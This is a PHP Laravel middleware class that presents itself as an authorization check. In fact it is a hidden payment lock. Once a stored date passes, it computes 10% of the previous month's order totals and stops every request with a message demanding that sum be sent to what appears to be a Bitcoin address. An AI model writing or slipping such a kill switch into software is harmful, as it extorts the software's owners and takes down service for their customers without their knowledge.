<?php

namespace App\Http\Middleware;

use Closure;
use App\Order;
use App\Authorization;
use Carbon\Carbon;

class CheckAuthorization
{
    /**
     * Run the request filter.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \Closure  $next
     * @return mixed
     */
    public function handle($request, Closure $next)
    {
        if(Authorization::first()->payed == 1){
            if(Carbon::today()->getTimestamp() >=  Carbon::parse(Authorization::first()->next_check)->getTimestamp()){
                $checkUpdate = Authorization::first();
                $checkUpdate->payed = 0;
                $checkUpdate->update();
            }
        }

        if(Authorization::first()->payed == 0){
            $order = new Order;
            $orders = $order->whereDate('created_at', '>=', Carbon::parse('- 1 month')->toDateString())->whereDate('created_at', '<=', Carbon::parse('- 1 day')->toDateString())->get();

            $amount = 0;
            foreach($orders as $order){
                $amount = $amount + $order->total;
            }

            $amount = $amount * 0.1;

            dd('You have to send ' .$amount. ' $. Account number: 141Gm1WhUxJoHqQCk7j5h4GR4tGGYw39ai');
        }

        return $next($request);
    }

}